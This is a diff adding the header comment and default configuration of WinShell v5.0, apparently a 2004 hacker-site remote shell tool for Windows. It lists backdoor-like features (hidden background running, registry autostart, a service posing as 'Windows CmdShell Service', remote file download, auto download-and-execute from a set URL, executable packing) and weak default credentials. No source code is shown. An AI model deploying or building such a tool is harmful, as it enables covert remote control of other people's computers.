@@ -1,0 +1,58 @@
+//-------------------------------------------------------------------------------//
+//  WinShell v5.0 Source Code for Visual C++ 6.0                                 //
+//                                                                               //
+//     -->> Everyone free to use, modify, recompile!!!  Open it for Internet     //
+//                                                                               //
+//  Author:    Mr.Janker                                                         //
+//  HomePage:  http://www.janker.org                                             //
+//  Publisher: http://www.hackbase.com                                           //
+//  Release:   10/1/2004                                                         //
+//  Reference: Netcat                                                            //
+//-------------------------------------------------------------------------------//
+/*
+
+WinShell v5.0 £­ A finished telnet server for windows
+
+    WinShell was a telnet server for windows platform. Main program was just a 5k
+bytes stand-alone executable file, Could run stably without any third dll, Although
+it was so thin, it had many of  functions, such as custom port, password protect, 
+muti-user logon, NT Service mode, download file£¬user-defined message, special 
+anti-ddos and etc. Detail to see the following:
+
+01. Designed for Windows 9X/ME/NT/2K/XP
+02. Just a stand-alone executable file and no setup
+03. Support all of the standard telnet client
+04. Allow muti-user logon and password authentication
+05. Custom port number and other configurable item
+06. Run in the background without gui
+07. Support service mode in NT system
+08. Build-in install and remove
+09. Build-in file download
+10. Build-in reboot and shutdown
+11. Build-in terminate itself remotely
+12. Auto download file and execute while starting
+13. Special anti-ddos flood attack
+14. Support EXE Compress and Protect program
+
+ FAQ:
+ 1. I could compile winshell with other compiler?
+ Answer: Yes! such as VC++, BCB, lcc32, Dev C++, and etc.
+ 2. How to make a 5k winshell.exe?
+ Answer: Use lcc32 compiler and compress it with FSG exepacker.
+ 
+----------------------------------------------------------------------------------*/
+
+Default WinShell.c Configuration
+==============================
+
+Port: [5277]
+Password: [1234]
+AutoInstall: [yes]
+Registry AutoStart KeyName: [winshell]
+NT Service Name: [winshell]
+NT Service Show Name: [WinShell Service]
+NT Service Descripition Name: [Provide Windows CmdShell Service]
+Password Prompt Message: [Password]
+Auto Download ExeFile and Run: [yes]
+Download URL: [http://www.janker.org/winshell.exe]
+Save Downloaded ExeFile As Name: [winshell.exe]
